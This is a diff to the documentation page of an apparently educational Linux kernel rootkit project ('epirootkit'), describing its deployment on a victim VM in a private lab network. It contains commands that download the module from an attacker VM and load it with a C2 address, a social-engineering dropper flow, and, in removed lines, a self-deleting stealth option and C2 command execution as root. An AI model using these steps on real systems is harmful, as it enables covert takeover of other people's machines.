@@ -15,7 +15,7 @@ weight: 204
 
 1. **Host setup**: [Host Environment Setup]({{< relref "environment.md" >}})
 2. **VM disk**: `victim.qcow2` in `/var/lib/libvirt/images/`
-3. **VM launched**: `sudo ./scripts/run_vms.sh victim`
+3. **VM launched**: `sudo ./scripts/run_vms.sh`
 
 
 ## VM Access
@@ -26,54 +26,46 @@ weight: 204
 
 ## Deploy Rootkit
 
-### 1. Get Payload
-Receive rootkit files from attacker VM:
+Choose your deployment method:
+
+{{< tabs tabTotal="2" >}}
+
+{{% tab tabName="Dropper (Social Engineering)" %}}
+
+### Automated Deployment
+
+Use the social engineering dropper for realistic attack simulation:
+
+1. **Access Landing Page**: `http://192.168.200.11:8080`
+2. **Download NeoGeoLoc**: Click download on the landing page
+3. **Run Application**: Execute the downloaded dropper
+4. **Click Register**: Application automatically downloads and installs rootkit
+
+**Details**: See [Dropper Deployment]({{< relref "dropper-deployment.md" >}}) for complete process and interface screenshots.
+
+{{% /tab %}}
+
+{{% tab tabName="Manual Deployment" %}}
+
+### Direct Installation
+
+For testing or development purposes:
+
+1. **Get Payload**: Download rootkit files directly from attacker VM
+2. **Transfer**: Copy `epirootkit.ko` to victim VM
+3. **Install**: Load kernel module manually
 
 ```bash
-# Option A: SCP transfer (from attacker VM)
-# First: sudo apt install -y openssh-server (inside victim VM)
-scp epirootkit.ko deploy_rootkit.sh victim@192.168.200.10:~/
-
-# Option B: HTTP download
-wget http://192.168.200.11:8080/epirootkit.ko
-wget http://192.168.200.11:8080/deploy_rootkit.sh
-
-# Option C: Web UI upload (In development)
-# Use attacker's web interface file transfer 
+# On victim VM
+wget http://192.168.200.11:3000/download/epirootkit.ko
+sudo insmod epirootkit.ko address=192.168.200.11 port=4444 #(default values)
 ```
 
-### 2. Deploy
-```bash
-# Default deployment (connects to 192.168.200.11:4444)
-sudo ./deploy_rootkit.sh
+{{% /tab %}}
 
-# Custom C2 server
-sudo ./deploy_rootkit.sh address=IP/domain port=PORT
+{{< /tabs >}}
 
-# Stealth deployment (self-destructs)
-sudo ./deploy_rootkit.sh --self-delete
-```
 
-### 3. Verify Connection
-Switch to attacker VM C2 server:
-```bash
-c2-server$ ls
-# • Client-1 - UNAUTHENTICATED - Last seen: Just now
-
-c2-server$ auth Client-1 password
-c2-server$ exec Client-1 whoami
-# Exit code: 0, Output: root
-```
-
-## Management
-
-```bash
-# Check status
-sudo ./deploy_rootkit.sh status
-
-# Remove rootkit
-sudo ./deploy_rootkit.sh uninstall
-```
 
 ## Next Steps
 
